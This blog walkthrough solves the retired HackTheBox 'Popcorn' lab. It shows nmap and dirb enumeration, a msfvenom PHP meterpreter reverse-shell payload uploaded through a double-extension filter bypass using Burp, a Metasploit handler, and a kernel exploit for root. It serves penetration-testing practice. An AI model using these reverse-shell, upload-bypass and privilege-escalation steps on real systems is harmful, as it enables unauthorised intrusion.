<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Popcorn Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-popcorn-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-03-28T14:52:20+00:00">March 28, 2018</time><time class="updated" datetime="2025-07-07T07:55:10+00:00">July 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “Popcorn” that offers an opportunity for those who want to increase their skill in penetration testing and black box testing. Hack the Box presents Popcorn as a retried vulnerable lab for making online penetration practices suitable for your experience level, and they provide a collection of vulnerable labs as challenges from beginners to expert level.</span></p>
<p><span style="color: #000000;"><strong>Level: </strong>Intermediate</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> Find <strong>user.txt</strong> and <strong>root.txt</strong> file in the victim’s machine.</span></p>
<h3><span style="color: #800000;">Initial Reconnaissance and Web Enumeration</span></h3>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP and IP of sense is <strong>10.10.10.6</strong> so let’s begin with nmap port enumeration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.6</pre>
<p><span style="color: #000000;">From the given below image, you can observe we found port 22,80 are open in the victim’s network.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ZPOEDHGf37U/Wrun5Q6tOgI/AAAAAAAAVwg/a5Hi8yaCV84XHRCmE40ushpF_Y0Qf2IDQCEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Knowing that the victim’s network has port 80 open, we preferred to explore his IP in the browser but didn’t get any remarkable clue for the next step.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hlvf8NqSOeM/Wrun7lrWVcI/AAAAAAAAVxI/YoHfV9MQ4uc6XdftYM2xhFao9emFOfKhgCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Then, we have <strong>used dirb</strong> tool of Kali to enumerate the directories from<strong> using the IP Address</strong>. The command we have used is <strong>dirb http://10.10.10.6  </strong>After checking most of the directories, we finally decided to go for /torrent directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uU5re-vauf0/Wrun7l92-qI/AAAAAAAAVxM/yp7pJKv8KkcT9OaujGHK9L-U5XcdypbvACEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">So next we decided to explore http://10.10.10.6/torrent/ through the browser URL, and we see a webpage displayed below. After looking at the page for some clue, we saw that we need to <strong>register</strong> on this site first.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qMNY52aMwm0/Wrun8CUBxTI/AAAAAAAAVxQ/FmHU0v9lEf851OFOQvMd50tmTNziwKWKACEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">After clicking on <strong>Register option</strong> on the Webpage. The registration form opened is shown below. As you can see you need to give details to successfully register on this site.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7C469U78CHw/Wrun8GiJF_I/AAAAAAAAVxU/qGGK3h6Zz64gSeLsJf6mHaenRAsDDWvmwCEwYBhgL/s1600/6.png"/></span></p>
<h3><span style="color: #800000;">File Upload Vulnerability Exploitation</span></h3>
<p><span style="color: #000000;">After successfully registering on the website. Click on <strong>Upload</strong> <strong>option</strong> and the page opened is shown below. Now here we have given the path of any <strong>torrent</strong> <strong>file</strong>. Then Click on <strong>upload</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-RGXqL0YAdls/Wrun8btq02I/AAAAAAAAVxY/2DMx4y2KzgcyZXfO1GePLfxYf57ukgh0QCEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">When we successfully upload the torrent file, the next page that appears is shown below. Now simply click on <strong>Edit this torrent </strong>option.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-_WGcmmv1J0A/Wrun8qaf2BI/AAAAAAAAVxc/zSczRQK3ef0I6OaYP8qy8r_hM495spAzACEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Now using Metasploit we have created a payload in php by using the command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.3 lport=4321 -f raw</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-w6DRPrShGgs/Wrun8-VD14I/AAAAAAAAVxg/ub7xC4gZnKsHqggY22YNa3lkh6psxr46ACEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Our current issue was that the update screenshot option was not accepting PHP files when we were uploading them. Here, we changed the file’s name to 123.php.png by appending php.png to it. and selected the “Submit Screenshot” option.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Vvm3LpTjxyk/Wrun5eHKvGI/AAAAAAAAVwk/R6gyTA392AcN26MeQePGDTw5GFauFKqjgCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">But before clicking on submit screenshot we have captured the request of this page using <strong>Burp Suite</strong>. Where you can see our file with a double extension has been successfully submitted.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-TcoPlcAZQ7w/Wrun5ejA7bI/AAAAAAAAVwo/NZAw5rE3Cio8ulrXI9QVHPJMFGnHQXhQACEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">As you can see have edited the file name to <strong>123.php.</strong> Now Click on <strong>Forward</strong> option in burp suite.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-s_aJaokbQlw/Wrun6KSec0I/AAAAAAAAVws/A9azaurV5ygQo1VCGUGEavwF5KAIsDXsQCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Next, we saw that our file has been successfully uploaded.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yAsOIH95Rqc/Wrun6OzrIvI/AAAAAAAAVww/ueRNPFHqMPc5fuFIKsm0V6iUl3_jAYRCACEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Next, we have again <strong>used dirb</strong> tool of kali to enumerate the directories from<strong> using the IP Address</strong>. The command we have used is <strong>dirb http://10.10.10.6/torrent/. </strong>After checking most of the directories, we finally decided to go for /torrent/upload/ directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-512x4R0E2mU/Wrun6Rou01I/AAAAAAAAVw0/8Dk6281WJnYdp1flouvtRyh1stO5YIyBACEwYBhgL/s1600/16.1.png"/></span></p>
<p><span style="color: #000000;">So next we decided to explore http://10.10.10.6/torrent/upload/ through the browser URL, and we see a Webpage shown below. We confirm that we successfully uploaded our file. By click on the file, we have uploaded.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Hiifz97Ovq0/Wrun63iplEI/AAAAAAAAVw4/j4SbwN8df7swcqb53Dg0SSQT-jYCe75OwCEwYBhgL/s1600/16.png"/></span></p>
<h3><span style="color: #800000;">Gaining Foothold via Meterpreter</span></h3>
<p><span style="color: #000000;">We have used Metasploit and got the meterpreter as you can see below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf use exploit/multi/handler
msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) set lhost 10.10.14.3
msf exploit(multi/handler) set lport 4321
msf exploit(multi/handler) exploit</pre>
<p><span style="color: #000000;">Once we have got the meterpreter. We have used command <strong>cd /home</strong>. Then we check inside the <strong>george </strong>directory using <strong>command ls /home/george</strong>, here we found out the user.txt file and read the file content which contains our first <strong>FLAG!!</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Uy33mkIWF4c/WrutNbHfu9I/AAAAAAAAVxs/1RIbn3gP9ag2dM-ZLPNXcnDrz1yrdRkNQCLcBGAs/s1600/17.png"/></p>
<p><span style="color: #000000;">We searched for kernel exploit on Google, where we discovered that it serves as an exploit for achieving local privilege escalation. We have simply downloaded the file on our Desktop.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-MVMJPKde_Qk/Wrun7KfcDCI/AAAAAAAAVxA/Lwey-QScvLQRKC_ryaSCKvO8LX7aNWGngCEwYBhgL/s1600/18.png"/></span></p>
<p><span style="color: #000000;">As you can see we have uploaded using the command <strong>upload /root/Desktop/15704.c Now</strong> we have used the command<strong> shell </strong>to access the root privilege. Now we have compiled<strong>. </strong>Next, we have given permission to the exploit. Using <strong>cd /root </strong>command we have found <strong>a root.txt</strong> file. And to view the contents we have used <strong>cat root.txt </strong>command. In the end, we have found our <strong>Final FLAG!!</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-urT9rOJQk9M/WrutJjQeCeI/AAAAAAAAVxo/DiCu-eb0H_Ab3VsOy8ERqYxJ02vCzYfiQCLcBGAs/s1600/19.png"/></p>
<p><span style="color: #000000;"><strong>Author</strong>: Ashray Gupta is a Researcher and Technical Writer at Hacking Articles<strong>. </strong>He is a certified ethical hacker, web penetration tester and a researcher in nanotechnology. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/ashray-gupta-b77221b6/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
